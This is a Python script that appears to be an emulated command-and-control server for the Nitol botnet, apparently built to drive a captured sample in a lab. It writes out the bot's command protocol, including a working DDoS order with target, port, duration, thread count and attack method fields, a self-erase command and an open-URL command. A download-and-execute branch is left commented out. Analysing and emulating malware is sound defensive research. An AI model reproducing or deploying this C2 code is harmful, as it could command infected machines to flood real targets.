
import os
import socket
import threading

# IP = socket.gethostbyname(socket.gethostname())
IP = "192.168.223.128"
PORT = 9999     # TODO: change this following actual malware.
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
SERVER_DATA_PATH = "server_data"
BYTE_ORDER = "little"

# Nitol CONFIG.
ORDER = (0x6).to_bytes(4, byteorder=BYTE_ORDER)      # 2: UDP/TCP DDoS; 6 clear; 0x10 download and execute file; 0x14 open webpage with IE
VICTIM = b"victim.com"       # len=0x11c
ATK_PORT = (8192).to_bytes(4, byteorder=BYTE_ORDER)   # DWORD
ATK_TIME = (16).to_bytes(4, byteorder=BYTE_ORDER)       # DWORD (in min.)
THREAD_COUNT = (8).to_bytes(4, byteorder=BYTE_ORDER)           # DWORD
ATK_METHOD = (9).to_bytes(4, byteorder=BYTE_ORDER)     # DWORD, 2: random_udp, 3: icmp

WEB_URL = b"www.victim.com"

def make_pkt():
    global VICTIM
    # make Nitol c2 pkt.
    if int.from_bytes(ORDER, BYTE_ORDER) == 2:
        # UDP/TCP DDoS
        while len(VICTIM) < 0x11c:
            VICTIM = VICTIM + b"\x00"
        data = VICTIM + ATK_PORT + ATK_TIME + THREAD_COUNT + ATK_METHOD
    elif int.from_bytes(ORDER, BYTE_ORDER) == 6:
        # erases itself & related files
        data = bytes()
    # elif int.from_bytes(ORDER, BYTE_ORDER) == 0x10:
        # download & execute file. 
    elif int.from_bytes(ORDER, BYTE_ORDER) == 0x14:
        # open URL with IE.
        data = WEB_URL
    
    buf_len = (len(data)).to_bytes(4, byteorder=BYTE_ORDER)
    payload = buf_len + ORDER + data
    return payload

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    # conn.send("OK@Welcome to the File Server.".encode(FORMAT))

    while True:
        data = conn.recv(SIZE)
        conn.send(make_pkt())

    print(f"[DISCONNECTED] {addr} disconnected")
    conn.close()

def main():
    print("[STARTING] Server is starting")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    server.listen()
    print(f"[LISTENING] Server is listening on {IP}:{PORT}.")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")

if __name__ == "__main__":
    main()
